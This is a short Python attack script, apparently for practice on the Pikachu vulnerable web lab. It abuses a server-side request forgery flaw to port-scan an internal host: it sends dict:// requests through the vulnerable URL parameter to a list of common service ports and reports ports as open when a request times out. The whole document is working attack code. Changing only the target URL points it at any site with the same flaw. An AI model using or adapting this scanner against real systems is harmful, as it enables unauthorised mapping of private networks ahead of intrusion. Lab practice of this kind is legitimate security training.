# SSRF_portscan
# Author:Yusy
# 高危端口参考:https://blog.csdn.net/wsy_china/article/details/88100110

import requests

ports = [21,22,23,25,53,69,80,81,82,110,443,3389,1433,1521,3306,3389,6379,8080,8081]

# 存在SSRF的URL
target_url = "http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url="

for port in ports:
    port = str(port)
    url = target_url+"dict://192.168.137.132:"+port+"/"+"info"
    try:
        response = requests.get(url,timeout=6)
    except:
        print("+" + "{} open".format(port))

